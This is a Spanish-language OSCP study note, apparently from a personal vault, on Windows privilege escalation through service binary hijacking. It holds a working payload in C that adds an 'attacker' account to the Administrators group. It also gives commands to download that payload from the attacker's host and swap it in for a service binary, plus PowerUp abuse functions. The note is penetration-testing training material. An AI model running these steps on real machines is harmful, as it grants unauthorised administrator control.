---
tipo: tecnica
fase: privesc
so: windows
tags: [oscp, tecnica, privesc, windows]
fecha: 2026-10-08
---

# Service Binary Hijacking

> [!abstract] Qué es y cuándo usarla
> Si el binario (`.exe`) de un servicio que corre como **LocalSystem** tiene permisos `(F)` Full access o `(M)` Modify para un grupo al que pertenece el user actual (ej. `BUILTIN\Users`), se puede sustituir ese binario por uno propio. Al reiniciar el servicio (o la máquina), el código del atacante se ejecuta con los privilegios del servicio.

## Requisitos previos
- Listar servicios y su `PathName`: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName`.
- Confirmar permisos de escritura sobre el binario con `icacls "<ruta>"` (buscar `(F)`/`(M)` para un grupo del user actual).
- Poder reiniciar el servicio: `net stop`/`Start-Service`, o si no, `whoami /priv` → `SeShutdownPrivilege` → `shutdown /r /t 0` (si el Startup Type es `Auto`).

## Pasos
```bash
# En Kali: preparar binario malicioso (crea un user y lo añade a Administrators)
cat > adduser.c <<'EOF'
#include <stdlib.h>
int main () {
    system("net user attacker Password123! /add");
    system("net localgroup administrators attacker /add");
    return 0;
}
EOF
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
python3 -m http.server 80
```
```powershell
# En el objetivo
iwr -uri http://<IP_kali>/adduser.exe -Outfile adduser.exe
move C:\ruta\servicio.exe servicio.exe.bak
move .\adduser.exe C:\ruta\servicio.exe
# reiniciar el servicio (net stop/start, Start-Service, o reboot con SeShutdownPrivilege)
Get-LocalGroupMember administrators     # confirmar que el nuevo user se creó
```

Automatizado con **PowerUp.ps1**:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile                            # lista servicios con binario modificable
Install-ServiceBinary -Name '<servicio>'              # AbuseFunction (puede fallar si el PathName lleva argumentos extra)
```

> [!warning] Detección / problemas
> - Tener `(F)` sobre el `.exe` no da permiso automático para `net stop`/`Start-Service`; puede requerir reiniciar la máquina.
> - La `AbuseFunction` de PowerUp (`Install-ServiceBinary`) puede fallar con rutas que llevan argumentos extra en `PathName`.
> - Restaurar siempre el binario original tras confirmar el acceso, para no dejar el servicio roto.

## Visto en
- Módulo: [[17 - Windows Privilege Escalation]]
- Relacionado: [[Unquoted Service Paths]] · [[DLL Hijacking]]
- Máquinas: [[]]
